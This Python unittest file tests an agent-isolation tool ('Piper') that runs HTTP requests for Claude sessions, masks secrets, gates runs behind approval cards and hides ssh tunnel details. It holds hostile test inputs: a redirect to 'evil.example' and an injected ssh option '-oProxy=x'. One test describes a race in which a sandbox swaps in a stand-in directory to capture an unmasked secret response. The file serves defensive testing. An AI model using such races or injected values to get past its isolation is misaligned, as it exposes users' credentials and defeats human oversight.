        self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)
        last = self.m.tool(s, "http_last_result", {"file": "http-client/api.http"})
        self.assertEqual(last["by"], "user (GUI)")
        self.assertNotIn("hunter22", json.dumps(last))

    def test_prod_gui_run_is_not_shared_until_the_user_shares_it(self):
        s = self.session()
        rec = self.m.http_gui_run(self.key, "http-client/api.http", "prod", None)
        self.assertFalse(rec["share"])
        self.assertNotIn("body", self.m.tool(s, "http_last_result", {})["requests"][0])
        self.m.http_share(rec["id"], True)
        self.assertIn("body", self.m.tool(s, "http_last_result", {})["requests"][0])

    def test_missing_ijhttp(self):
        os.environ["PIPER_IJHTTP"] = "/nonexistent/ijhttp"
        self.addCleanup(os.environ.__setitem__, "PIPER_IJHTTP", os.path.join(HERE, "fake-ijhttp.py"))
        if hc.find_ijhttp(self.m._http_policy()) is None:
            with self.assertRaisesRegex(hc.HttpError, "not installed"):
                self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)


    # ---------------------------------------------------------------- save_to, hints, tunnels (2026-10-06)
    def fake_open(self, status=200, body=b"%PDF-1.7 binary\0", ctype="application/pdf", location=""):
        import email.message
        import io
        import urllib.error
        sent = []

        class Resp:
            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

            def __init__(self):
                self.status, self.reason = status, "OK"
                self.headers = email.message.Message()
                self.headers["Content-Type"] = ctype
                self.stream = io.BytesIO(body)

            def read(self, n=-1):
                return self.stream.read(n)

        def http_open(req, timeout, insecure):
            sent.append({"url": req.full_url, "method": req.get_method(), "headers": dict(req.header_items()),
                         "data": req.data, "insecure": insecure})
            if status >= 300:
                h = email.message.Message()
                if location:
                    h["Location"] = location
                raise urllib.error.HTTPError(req.full_url, status, "Found", h, io.BytesIO(b""))
            return Resp()
        old = hc.http_open
        hc.http_open = http_open
        self.addCleanup(setattr, hc, "http_open", old)
        return sent

    def dev_rm(self, rel):
        self.addCleanup(lambda: os.path.exists(os.path.join(self.root, rel)) and os.unlink(os.path.join(self.root, rel)))

    def test_save_to_writes_the_whole_response_into_development(self):
        s = self.session()
        self.m._allow_hosts(self.key, ["upload.example.com"])
        self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)           # stores the global sessionId=S-1
        sent = self.fake_open()
        self.dev_rm("development/posudek.pdf")
        self.always = True
        r = self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "index": 1, "save_to": "posudek.pdf"})
        with open(os.path.join(self.root, "development/posudek.pdf"), "rb") as f:
            self.assertEqual(f.read(), b"%PDF-1.7 binary\0")
        q = r["requests"][0]
        self.assertEqual((q["saved"], q["saved_bytes"], q["status"], r["ok"]), ("development/posudek.pdf", 16, 200, True))
        self.assertEqual(len(self.runs()), 1)                                         # ijhttp did not run for the save
        self.assertEqual(sent[0]["url"], "https://api.example.com/api/detail?id=1&x=2")
        self.assertEqual(sent[0]["method"], "GET")
        self.assertEqual(sent[0]["headers"]["X-session"], "S-1")                     # the global of the last run
        self.assertIn("development/posudek.pdf", self.asked[0][1])                   # the card says where it goes

    def test_save_to_encodes_basic_credentials_after_substitution(self):
        s = self.session()
        sent = self.fake_open()
        self.always = True
        self.dev_rm("development/auth.pdf")
        token = base64.b64encode(b"demo:hunter22").decode()
        for name, value, expected in (
            ("Authorization", "Basic {{user}} {{apiPassword}}", "Basic " + token),
            ("authorization", "bAsIc {{user}} {{apiPassword}}", "Basic " + token),
            ("Authorization", "Basic " + token, "Basic " + token),
            ("Authorization", "Bearer synthetic-token", "Bearer synthetic-token"),
            ("X-Custom", "Basic demo hunter22", "Basic demo hunter22"),
        ):
            with self.subTest(name=name, value=value):
                self.write("http-client/auth.http", "GET {{acme.domain}}/download\n%s: %s\n" % (name, value))
                result = self.m.tool(s, "http_run", {"file": "http-client/auth.http", "env": "dev",
                                                    "index": 0, "save_to": "auth.pdf"})
                self.assertEqual(sent[-1]["headers"][name.capitalize()], expected)
                self.assertTrue(result["ok"], result)
                with open(os.path.join(self.root, "development/auth.pdf"), "rb") as f:
                    self.assertEqual(f.read(), b"%PDF-1.7 binary\0")
                self.assertNotIn("hunter22", json.dumps(result))
                self.assertNotIn(token, json.dumps(result))

    def test_save_to_uses_the_stored_globals_and_masks_secrets_in_text(self):
        s = self.session()
        self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)           # stores sessionId=S-1
        self.fake_open(body=b'{"pw":"hunter22","ok":1}', ctype="application/json")
        self.dev_rm("development/out.json")
        self.always = True
        r = self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "index": 1, "save_to": "out.json"})
        with open(os.path.join(self.root, "development/out.json")) as f:
            self.assertEqual(f.read(), '{"pw":"%s","ok":1}' % hc.MASK)
        self.assertIn("masked", r["requests"][0]["saved_note"])

    def test_save_to_refuses_a_binary_with_a_secret_a_redirect_and_bad_targets(self):
        s = self.session()
        self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)           # the global sessionId
        self.always = True
        self.fake_open(body=b"%PDF hunter22 \0")
        r = self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "index": 1, "save_to": "x.pdf"})
        self.assertIn("holds a secret", r["requests"][0]["error"])
        self.assertFalse(os.path.exists(os.path.join(self.root, "development/x.pdf")))
        self.fake_open(status=302, location="https://evil.example/")
        r = self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "index": 1, "save_to": "x.pdf"})
        self.assertIn("HTTP 302", r["requests"][0]["error"])                       # shown, never followed
        self.assertFalse(os.path.exists(os.path.join(self.root, "development/x.pdf")))
        for target, why in (("http-client/body.json", "tracked by git"), ("config/secrets/x.pdf", "hidden"),
                            (".git/hooks/x", "hidden files"), ("http-client/new.http", ".http"), ("../x", "inside the project")):
            with self.assertRaisesRegex(hc.HttpError, why, msg=target):
                self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "index": 1, "save_to": target})
        common.write_json(hc.GLOBALS_FILE, {})   # the globals are gone: an unresolved variable is refused
        self.fake_open()
        r = self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "index": 1, "save_to": "x.pdf"})
        self.assertIn("unresolved {{sessionId}}", r["requests"][0]["error"])
        with self.assertRaisesRegex(hc.HttpError, "needs index"):
            self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "save_to": "x.pdf"})
        with self.assertRaisesRegex(hc.HttpError, "include_body"):
            self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "prod", "index": 1, "save_to": "x.pdf"})

    def test_save_to_has_a_wall_clock_deadline_and_case_insensitive_tracking(self):
        s = self.session()
        self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)
        self.always = True
        sent = self.fake_open()
        clock = iter(range(0, 10 ** 6, 100))                       # every read: 100 s later
        old = hc.time.time
        hc.time.time = lambda: next(clock)
        try:
            r = self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "index": 1, "save_to": "slow.pdf"})
        finally:
            hc.time.time = old
        self.assertIn("took longer", r["requests"][0]["error"])
        self.assertFalse(os.path.exists(os.path.join(self.root, "development/slow.pdf")))
        self.assertEqual(len(sent), 1)
        if os.path.exists(os.path.join(self.root, "HTTP-CLIENT/BODY.JSON")):   # a case-insensitive disk (macOS)
            with self.assertRaisesRegex(hc.HttpError, "tracked by git"):
                self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "index": 1,
                                            "save_to": "http-client/BODY.JSON"})

    def test_ssl_configuration_in_a_file_a_session_writes_is_ignored(self):
        priv = json.loads(json.dumps(PRIVATE))
        priv["test"] = {hc.SSL_KEY: {"verifyHostCertificate": False}}
        self.write("http-client/http-client.private.env.json", json.dumps(priv))
        self.addCleanup(self.write, "http-client/http-client.private.env.json", json.dumps(PRIVATE))
        s = self.session()
        self.m._allow_hosts(self.key, ["upload.example.com"])
        self.always = True
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "test"})
        self.assertNotIn("--insecure", self.runs()[0]["argv"])

    def test_a_rule_hiding_everything_trusts_nothing(self):
        opened = self.tunnel_project()
        ctx = dict(self.m._http_gui_ctx(self.key), hidden=lambda rel: True)
        pub, priv = self.m._load_env(self.root, "tun/http-client")
        self.assertIsNone(self.m._http_tunnel(ctx, next(iter(self.TUN_ENV)), "tun/http-client", pub, priv, "test"))
        with self.assertRaisesRegex(hc.HttpError, "sessions can see or write"):
            self.m._http_tunnel(ctx, "test app", "tun/http-client", pub, priv, "test")
        self.assertEqual(opened, [])

    def test_save_to_names_the_request_that_sets_a_missing_global(self):
        s = self.session()
        common.write_json(hc.GLOBALS_FILE, {})
        self.always = True
        self.fake_open()
        r = self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "index": 1, "save_to": "x.pdf"})
        self.assertIn("{{sessionId}} is set by request #0 'Login'", r["requests"][0]["error"])

    def test_save_to_hard_deadline_and_broken_responses(self):
        import http.client
        r = {"name": "x", "method": "GET", "url": "https://a.example/", "headers": [], "body": "", "pre": None,
             "scripts": [], "handler_file": None}
        old = hc.http_open
        self.addCleanup(setattr, hc, "http_open", old)
        hc.http_open = lambda req, timeout, insecure: (_ for _ in ()).throw(http.client.IncompleteRead(b"abc", 100))
        row, raw = hc.fetch_deadline(r, {}, {}, False, 5)
        self.assertIn("IncompleteRead", row["error"])
        gate = __import__("threading").Event()
        self.addCleanup(gate.set)
        hc.http_open = lambda req, timeout, insecure: gate.wait(30)   # headers never come
        t0 = __import__("time").time()
        row, raw = hc.fetch_deadline(r, {}, {}, False, 0)
        self.assertLess(__import__("time").time() - t0, 10)
        self.assertIn("no complete response within 0 s", row["error"])

    def test_session_approval_does_not_cover_a_save(self):
        s = self.session()
        self.m._allow_hosts(self.key, ["upload.example.com"])
        self.m.http_gui_run(self.key, "http-client/api.http", "test", None)
        self.fake_open()
        self.dev_rm("development/a.pdf")
        self.always = True
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "test", "index": 1})
        self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "test", "index": 1, "save_to": "a.pdf"})
        self.assertEqual([a[0] for a in self.asked], ["http_test", "http_test"])

    def test_agent_view_hints_and_binary_bodies(self):
        pdf = CONSOLE.replace("content-type: application/json", "content-type: application/pdf").replace(
            '{"sessionId"', '%PDF-1.7 \ufffd\ufffd {"sessionId"')
        with open(self.spec, "w") as f:
            json.dump({"rc": 1, "xml": XML, "console": pdf.replace(
                "java.net.UnknownHostException: api.example.com\n", "javax.net.ssl.SSLHandshakeException: PKIX path building failed\n")}, f)
        s = self.session()
        self.m._allow_hosts(self.key, ["upload.example.com"])
        self.always = True
        r = self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev"})
        self.assertIn("binary application/pdf", r["requests"][0]["body"])
        self.assertIn("save_to", r["requests"][0]["body"])
        self.assertIn("verifyHostCertificate", r["requests"][1]["error"])

    def test_a_binary_response_stops_the_cli_run_and_the_rest_is_reported(self):
        stop = CONSOLE.split("{\"sessionId\"")[0].replace("application/json", "application/pdf") + \
            "<Binary response body is ignored. You can save it to file with '>>'>\n\n" \
            "kotlinx.coroutines.JobCancellationException: Job was cancelled\n"
        with open(self.spec, "w") as f:
            json.dump({"rc": 1, "console": stop, "xml": ""}, f)
        s = self.session()
        self.m._allow_hosts(self.key, ["upload.example.com"])
        self.always = True
        r = self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev"})
        q = r["requests"]
        self.assertEqual((len(q), q[0]["status"], q[0]["ok"]), (3, 200, False))
        self.assertEqual(q[0]["tests"][0]["name"], "(not evaluated)")   # Login has tests: no report, not "ok"
        self.assertIn("binary application/pdf", q[0]["body"])
        self.assertTrue(all("not run - the ijhttp CLI stops" in x["error"] for x in q[1:]))
        self.assertFalse(r["ok"])
        stop1 = stop.replace("Request 'Login' POST https://api.example.com/api/login", "Request 'detail' GET https://api.example.com/api/detail?id=1&x=2")
        with open(self.spec, "w") as f:
            json.dump({"rc": 1, "console": stop1, "xml": ""}, f)
        r = self.m.tool(s, "http_run", {"file": "http-client/api.http", "env": "dev", "index": 1})
        self.assertTrue(r["ok"], r)                                 # one binary request without tests: answered fine

    def test_ssl_configuration_turns_into_insecure(self):
        env = json.loads(json.dumps(ENV))
        env["test"][hc.SSL_KEY] = {"verifyHostCertificate": False}
        self.write("http-client/http-client.env.json", json.dumps(env))
        self.addCleanup(self.write, "http-client/http-client.env.json", json.dumps(ENV))
        self.m.http_gui_run(self.key, "http-client/api.http", "test", None)
        self.assertIn("--insecure", self.runs()[0]["argv"])
        self.assertNotIn("SSLConfiguration", self.m.http_gui_envs(self.key, "http-client/api.http")["variables"]["test"])

    TUN_ENV = {"test with tunel `ssh -L 8443:192.0.2.1:443 projects@test-k.example`": {"domain": "https://localhost:8443"},
               "test app": {"domain": "http://localhost:18080", "piper": {"tunnel": "test/app"}},
               "test bad": {"domain": "http://localhost:18081", "piper": {"tunnel": "prod/app"}}}

    def tunnel_project(self, private=None):
        self.write("tun/http-client/t.http", "### Detail\nGET {{domain}}/api/x\nAccept: application/pdf\n\n"
                   "### Literal\nGET https://localhost:8443/raw\n")
        self.write("tun/http-client/http-client.env.json", json.dumps(self.TUN_ENV))
        for f in ("tun/http-client/t.http", "tun/http-client/http-client.env.json"):
            self.addCleanup(os.unlink, os.path.join(self.root, f))
        if private is not None:
            self.write("tun/http-client/http-client.private.env.json", json.dumps(private))
            self.addCleanup(os.unlink, os.path.join(self.root, "tun/http-client/http-client.private.env.json"))
        opened = []
        self.m._db_ssh_open = lambda c, session: (opened.append(c), 43999)[1]
        self.m._db_tunnel_open = lambda c, session: (opened.append(c), 43888)[1]
        self.addCleanup(lambda: [self.m.__dict__.pop(k, None) for k in ("_db_ssh_open", "_db_tunnel_open")])
        return opened

    def test_ssh_tunnel_from_the_environment_name(self):
        opened = self.tunnel_project()
        env = next(iter(self.TUN_ENV))
        rec = self.m.http_gui_run(self.key, "tun/http-client/t.http", env, None)
        c = opened[0]
        self.assertEqual((c["ssh"], c["host"], c["port"], c["cls"]),
                         ({"host": "test-k.example", "user": "projects"}, "192.0.2.1", 443, "test"))
        run = self.runs()[0]
        self.assertIn("--insecure", run["argv"])                                   # the certificate is not for localhost
        self.assertEqual(json.loads(run["envs"]["-v"])[env]["domain"], "https://localhost:43999")
        self.assertIn("GET https://localhost:43999/raw", run["text"])              # a literal URL too
        self.assertIn("projects@test-k.example", rec["tunnel"])
        self.assertEqual(self.m.http_run_record(rec["id"])["tunnel"], rec["tunnel"])   # stored with the run
        envs = self.m.http_gui_envs(self.key, "tun/http-client/t.http")
        self.assertIn("ssh projects@test-k.example -> 192.0.2.1:443", envs["tunnels"][env])
        self.assertIn("goes to prod", envs["tunnels"]["test bad"])

    def test_stack_tunnel_and_class_mismatch(self):
        opened = self.tunnel_project()
        self.m.http_gui_run(self.key, "tun/http-client/t.http", "test app", 0)
        self.assertEqual(opened[0]["tunnel"], {"env": "test", "target": "app"})
        self.assertEqual(json.loads(self.runs()[0]["envs"]["-v"])["test app"]["domain"], "http://localhost:43888")
        with self.assertRaisesRegex(hc.HttpError, "goes to prod"):
            self.m.http_gui_run(self.key, "tun/http-client/t.http", "test bad", 0)

    def test_a_tunnel_always_asks_a_session_and_hides_its_details(self):
        opened = self.tunnel_project()
        env = dict(self.TUN_ENV)
        env["dev tun"] = {"domain": "https://localhost:8443", "piper": {"ssh": "u@bastion.example", "forward": "10.0.0.1:443"}}
        env["test note `ssh -L 8443:10.1.1.1:443 u@b.example`"] = {"domain": "https://t.example"}   # the name is a note only
        self.write("tun/http-client/http-client.env.json", json.dumps(env))
        s = self.session()
        envs = self.m.tool(s, "http_envs", {"file": "tun/http-client/t.http"})
        self.assertEqual(envs["tunnels"]["dev tun"], "Piper opens a tunnel for this environment")
        self.assertNotIn("bastion", json.dumps(envs))
        self.assertNotIn("test note `ssh -L 8443:10.1.1.1:443 u@b.example`", envs["tunnels"])
        self.m._allow_hosts(self.key, ["localhost"])
        r = self.m.tool(s, "http_run", {"file": "tun/http-client/t.http", "env": "dev tun", "index": 0})
        self.assertEqual([a[0] for a in self.asked], ["http_dev"])     # dev, but a tunnel: a card
        self.assertEqual(r["tunnel"], "through Piper's tunnel")
        self.assertEqual(len(opened), 1)

    def test_a_failed_ssh_names_the_opt_out(self):
        import dbtools
        self.tunnel_project()

        def fail(c, session):
            raise dbtools.DbError("the ssh tunnel projects@test-k.example failed: Permission denied")
        self.m._db_ssh_open = fail
        with self.assertRaisesRegex(hc.HttpError, "Permission denied.*set the tunnel to None"):
            self.m.http_gui_run(self.key, "tun/http-client/t.http", next(iter(self.TUN_ENV)), 0)

    def test_piper_settings_win_over_the_env_file_and_drive_the_tunnel(self):
        opened = self.tunnel_project()
        env = next(iter(self.TUN_ENV))
        if os.path.exists(hc.ENVCFG_FILE):
            os.unlink(hc.ENVCFG_FILE)
        self.addCleanup(lambda: os.path.exists(hc.ENVCFG_FILE) and os.unlink(hc.ENVCFG_FILE))
        F = "tun/http-client/t.http"
        v = {e["name"]: e for e in self.m.http_gui_envcfg(self.key, F)["envs"]}
        self.assertEqual((v[env]["tunnel"]["source"], v[env]["tunnel"]["state"]), ("environment name", "closed"))
        self.assertTrue(self.m.http_gui_envcfg(self.key, F)["files"]["public"]["hidden"])
        # None: the user opens it by hand - no ssh, no rewrite
        self.m.http_gui_envcfg_save(self.key, F, env, {"tunnel": {"kind": "none"}})
        self.m.http_gui_run(self.key, F, env, 0)
        self.assertEqual(opened, [])
        self.assertIn("https://localhost:8443", self.runs()[0]["envs"]["-v"])
        # an ssh tunnel of Piper's settings on an environment without any declaration
        self.m.http_gui_envcfg_save(self.key, F, "test app", {"tunnel": {"kind": "ssh", "ssh": "u@bastion.example:2222",
                                                                        "forward": "10.0.0.9:8080", "port": 18080}})
        self.m.http_gui_run(self.key, F, "test app", 0)
        self.assertEqual((opened[0]["ssh"], opened[0]["host"], opened[0]["port"]),
                         ({"host": "bastion.example", "user": "u", "port": 2222}, "10.0.0.9", 8080))
        v = {e["name"]: e for e in self.m.http_gui_envcfg(self.key, F)["envs"]}
        self.assertEqual(v["test app"]["tunnel"]["source"], "Piper settings")
        # the route the GUI draws: localhost:<local> -> via -> to
        self.assertEqual({k: v["test app"]["tunnel"][k] for k in ("local", "via", "to")},
                         {"local": 18080, "via": "u@bastion.example:2222", "to": "10.0.0.9:8080"})
        # the certificate check: Piper's setting wins over the class policy (dev = --insecure by default)
        self.m.http_gui_envcfg_save(self.key, F, env, {"tunnel": {"kind": "none"}, "verify_tls": True})
        self.m.http_gui_run(self.key, F, env, 0)
        self.assertNotIn("--insecure", self.runs()[-1]["argv"])
        self.m.http_gui_envcfg_save(self.key, F, env, {"tunnel": {"kind": "none"}, "verify_tls": False})
        self.m.http_gui_run(self.key, F, env, 0)
        self.assertIn("--insecure", self.runs()[-1]["argv"])
        # back to automatic: nothing stored
        self.m.http_gui_envcfg_save(self.key, F, env, {})
        self.assertEqual(self.m._http_envcfg(self.key, "tun/http-client", env), {})
        for bad in ({"tunnel": {"kind": "x"}}, {"tunnel": {"kind": "ssh", "ssh": "-oProxy=x", "forward": "h:1", "port": 1}},
                    {"tunnel": {"kind": "stack", "target": "prod/app", "port": 1}}, {"verify_tls": "no"},
                    {"tunnel": {"kind": "ssh", "ssh": "u@h", "forward": "h:1", "port": 99999}}):
            with self.assertRaises(hc.HttpError, msg=bad):
                self.m.http_gui_envcfg_save(self.key, F, "test app", bad)
        with self.assertRaisesRegex(hc.HttpError, "unknown environment"):
            self.m.http_gui_envcfg_save(self.key, F, "nope", {})
        # an empty form never silently switches the automatic tunnel off
        with self.assertRaisesRegex(hc.HttpError, "server and the forward"):
            self.m.http_gui_envcfg_save(self.key, F, env, {"tunnel": {"kind": "ssh", "ssh": "", "forward": ""}})
        with self.assertRaisesRegex(hc.HttpError, "needs a target"):
            self.m.http_gui_envcfg_save(self.key, F, "test app", {"tunnel": {"kind": "stack", "target": ""}})
        self.assertEqual(self.m._http_envcfg(self.key, "tun/http-client", env), {})
        info = self.m.http_gui_envcfg(self.key, F)
        self.assertEqual((info["targets"], info["targets_loaded"]), ([], False))   # the stack only asked for the dialog

    def test_session_approval_does_not_cover_a_changed_tunnel_setting(self):
        opened = self.tunnel_project()
        F = "tun/http-client/t.http"
        self.addCleanup(lambda: os.path.exists(hc.ENVCFG_FILE) and os.unlink(hc.ENVCFG_FILE))
        s = self.session()
        self.always = True
        self.m.tool(s, "http_run", {"file": F, "env": "test app", "index": 0})
        self.m.tool(s, "http_run", {"file": F, "env": "test app", "index": 0})
        self.assertEqual(len(self.asked), 1)                         # the same content: remembered
        self.m.http_gui_envcfg_save(self.key, F, "test app", {"verify_tls": False})
        self.m.tool(s, "http_run", {"file": F, "env": "test app", "index": 0})
        self.assertEqual(len(self.asked), 2)                         # a changed setting: asked again
        self.assertTrue(opened)

    def test_tunnel_open_close_test_from_the_gui(self):
        opened = self.tunnel_project()
        env = next(iter(self.TUN_ENV))
        closed = []
        self.m._db_tunnel_close = lambda tk, why: closed.append((tk, why))
        self.addCleanup(lambda: self.m.__dict__.pop("_db_tunnel_close", None))
        r = self.m.http_gui_tunnel(self.key, "tun/http-client/t.http", env, "test")
        self.assertIn("no answer on 127.0.0.1:43999", r["test"])          # the fake port listens nowhere
        self.assertEqual(len(opened), 1)
        self.m.http_gui_tunnel(self.key, "tun/http-client/t.http", env, "close")
        self.assertTrue(closed and closed[0][0].startswith("ssh|http:"))
        with self.assertRaisesRegex(hc.HttpError, "has no tunnel"):
            self.m.http_gui_tunnel(self.key, "http-client/api.http", "dev", "open")

    def test_files_show_a_hidden_env_file_to_the_human(self):
        """2026-10-07: Files opens and saves a file hidden from Claude like any other (marked, audited)."""
        import projectfs
        rel = "config/secrets/db.properties"
        r = self.m.fs(self.key, "read", {"path": rel})
        self.assertEqual((r["lines"], r["hidden"]), (["1\tdb.password=x"], True))
        ls = self.m.fs(self.key, "list", {"path": "config/secrets"})
        self.assertEqual([(e["name"], e["hidden"]) for e in ls["entries"]], [("db.properties", True)])
        top = {e["name"]: e for e in self.m.fs(self.key, "list", {"path": "."})["entries"]}
        self.assertNotIn(".git", top)                                  # never
        self.assertFalse(top["src"]["hidden"])
        w = self.m.fs_write(self.key, rel, "db.password=y", r["sha"])
        self.addCleanup(lambda: open(os.path.join(self.root, rel), "w").write("db.password=x\n"))
        with open(os.path.join(self.root, rel)) as f:
            self.assertEqual(f.read(), "db.password=y\n")
        self.assertTrue(w["sha"])
        with self.assertRaises(projectfs.FsError):
            self.m.fs(self.key, "read", {"path": ".git/config"})
        self.assertIn(rel, self.m.fs(self.key, "files", {})["files"])
        with open(common.AUDIT_FILE) as f:
            ev = [json.loads(ln) for ln in f if ln.strip()]
        hit = [e for e in ev if e.get("event") == "gui-read-hidden" and e.get("path") == rel]
        self.assertTrue(hit and "db.password" not in json.dumps(hit))   # audited, without content
        self.assertTrue([e for e in ev if e.get("event") == "gui-write" and e.get("path") == rel and e.get("hidden")])

    def test_test_connection_needs_an_answer_from_behind_the_tunnel(self):
        import socket
        import threading
        self.tunnel_project()
        env = next(iter(self.TUN_ENV))

        def server(reply: bytes):
            so = socket.socket()
            try:
                so.bind(("127.0.0.1", 0))
            except OSError as e:
                self.skipTest("cannot bind a socket here: %s" % e)
            so.listen(2)

            def serve():
                for _ in range(2):
                    try:
                        c, _a = so.accept()
                    except OSError:
                        return
                    c.recv(64)
                    if reply:
                        c.sendall(reply)
                    c.close()
            threading.Thread(target=serve, daemon=True).start()
            self.addCleanup(so.close)
            return so.getsockname()[1]
        dead, alive = server(b""), server(b"HTTP/1.0 400 Bad Request\r\n\r\n")
        self.m._db_ssh_open = lambda c, session: dead      # ssh accepts locally, the forward goes nowhere
        r = self.m.http_gui_tunnel(self.key, "tun/http-client/t.http", env, "test")
        self.assertIn("nothing answers behind it", r["test"])
        self.assertFalse(r["test_ok"])
        self.m._db_ssh_open = lambda c, session: alive
        r = self.m.http_gui_tunnel(self.key, "tun/http-client/t.http", env, "test")
        self.assertIn("the server behind the tunnel answers", r["test"])
        self.assertTrue(r["test_ok"])

    def test_gui_save_to(self):
        self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)
        self.fake_open()
        self.dev_rm("development/gui.pdf")
        rec = self.m.http_gui_run(self.key, "http-client/api.http", "dev", 1, save_to="gui.pdf")
        self.assertEqual(rec["requests"][0]["saved"], "development/gui.pdf")
        self.assertTrue(os.path.exists(os.path.join(self.root, "development/gui.pdf")))

    def test_gui_save_to_a_hidden_file_is_unmasked_and_in_place(self):
        """L3b (2026-10-07): the GUI's run may save into a file hidden from Claude - as received; an
        existing one keeps its inode (P0: a rename detaches a live sandbox's over-mount), a new one only
        where no live sandbox would see it. A session's save_to there stays refused."""
        self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)
        self.fake_open(body=b'{"pw":"hunter22"}', ctype="application/json")
        rel = "config/secrets/out.json"
        self.write(rel, "old\n")
        self.dev_rm(rel)
        full = os.path.join(self.root, rel)
        ino = os.stat(full).st_ino
        s = self.session()   # a live sandbox of the tree: the existing file is covered, written in place
        s.coverage = [{"root": self.root, "overmounts": ["config/secrets"],
                       "ids": guard.overmount_ids(self.root, ["config/secrets"])}]
        rec = self.m.http_gui_run(self.key, "http-client/api.http", "dev", 1, save_to=rel)
        self.assertEqual(rec["requests"][0]["saved"], rel)
        with open(full) as f:
            self.assertEqual(f.read(), '{"pw":"hunter22"}')
        self.assertEqual(os.stat(full).st_ino, ino)
        self.assertNotIn("saved", self.m._agent_record(rec["id"])["requests"][0])   # a session's copy names no hidden file
        s.coverage = [{"root": self.root, "overmounts": []}]   # review 2026-10-08: the sandbox sees that existing file
        rec = self.m.http_gui_run(self.key, "http-client/api.http", "dev", 1, save_to=rel)
        self.assertIn("sees it", rec["requests"][0]["error"])            # refused like fs_write, nothing written
        with open(full) as f:
            self.assertEqual(f.read(), '{"pw":"hunter22"}')
        s.coverage = []
        new = "config/secrets/new.json"
        self.dev_rm(new)
        rec = self.m.http_gui_run(self.key, "http-client/api.http", "dev", 1, save_to=new)
        self.assertIn("would see it", rec["requests"][0]["error"])   # nothing over-mounts it in that sandbox
        self.assertFalse(os.path.exists(os.path.join(self.root, new)))
        self.m.sessions.pop(s.id)
        rec = self.m.http_gui_run(self.key, "http-client/api.http", "dev", 1, save_to=new)
        with open(os.path.join(self.root, new)) as f:
            self.assertEqual(f.read(), '{"pw":"hunter22"}')
        with self.assertRaisesRegex(hc.HttpError, "hidden by the isolation policy"):
            self.m.tool(self.session(), "http_run", {"file": "http-client/api.http", "env": "dev", "index": 1,
                                                     "save_to": new})

    def test_gui_save_to_a_hidden_file_never_lands_in_a_stand_in_swapped_in_meanwhile(self):
        """N10 wave 2: save_to checked the over-mount by path (_hidden_write_guard / _ops_guard), then
        overwrite_in_place opened the file by path - a sandbox that put a stand-in at the path in between
        (moved the over-mounted directory's parent, mkdir) got the unmasked response. Refused now, the stand-in
        untouched; without a race it is saved as before."""
        import shutil
        from unittest import mock
        self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)
        self.fake_open(body=b'{"pw":"hunter22"}', ctype="application/json")
        old_rel, new_rel = "config/secrets/out.json", "config/secrets/new.json"
        self.write(old_rel, "old\n")
        self.dev_rm(old_rel)
        self.dev_rm(new_rel)
        root = self.root

        def swap_out():
            if os.path.isdir(os.path.join(root, "config_old")):
                shutil.rmtree(os.path.join(root, "config"))
                os.rename(os.path.join(root, "config_old"), os.path.join(root, "config"))
        self.addCleanup(swap_out)
        s = self.session()
        s.coverage = [{"root": root, "overmounts": ["config/secrets"],
                       "ids": guard.overmount_ids(root, ["config/secrets"])}]

        def swap_in(*_):
            os.rename(os.path.join(root, "config"), os.path.join(root, "config_old"))
            os.makedirs(os.path.join(root, "config/secrets"))
            with open(os.path.join(root, old_rel), "w") as f:
                f.write("stand-in\n")
        for name, rel in (("_hidden_write_guard", old_rel), ("_ops_guard", new_rel)):
            real = getattr(self.m, name)
            with mock.patch.object(self.m, name, lambda *a, real=real: (real(*a), swap_in())[0]):
                rec = self.m.http_gui_run(self.key, "http-client/api.http", "dev", 1, save_to=rel)
            self.assertIn("would see it there", rec["requests"][0].get("error", ""), name)
            with open(os.path.join(root, old_rel)) as f:
                self.assertEqual(f.read(), "stand-in\n", name)
            self.assertFalse(os.path.exists(os.path.join(root, new_rel)), name)
            swap_out()
        rec = self.m.http_gui_run(self.key, "http-client/api.http", "dev", 1, save_to=old_rel)   # no race: saved
        self.assertEqual(rec["requests"][0]["saved"], old_rel)
        with open(os.path.join(root, old_rel)) as f:
            self.assertEqual(f.read(), '{"pw":"hunter22"}')
        self.m.sessions.pop(s.id)

    def test_gui_env_urls_and_console_output_are_unmasked_for_the_human(self):
        """L3c + L3d (2026-10-07): the human's own values; a session's copy stays masked."""
        self.write("http-client/pw.http", "GET {{acme.domain}}/x?pw={{apiPassword}}\n")
        self.addCleanup(os.unlink, os.path.join(self.root, "http-client/pw.http"))
        r = self.m.http_gui_envs(self.key, "http-client/pw.http")
        self.assertEqual(r["urls"]["dev"], ["https://api.example.com/x?pw=hunter22"])
        with open(self.spec, "w") as f:
            json.dump({"rc": 1, "console": "Exception: login hunter22 refused\n", "xml": ""}, f)
        rec = self.m.http_gui_run(self.key, "http-client/api.http", "dev", None)
        self.assertIn("hunter22", rec["output"])
        agent = self.m._agent_record(rec["id"])
        self.assertIn("refused", agent["output"])
        self.assertNotIn("hunter22", agent["output"])

    def test_an_allow_listed_env_file_is_not_trusted(self):
        opened = self.tunnel_project()
        old = self.m.policy.get("allow")
        self.m.policy["allow"] = ["**/tun/http-client/http-client.env.json"]
        self.addCleanup(lambda: self.m.policy.__setitem__("allow", old) if old is not None else self.m.policy.pop("allow", None))
        s = self.session()
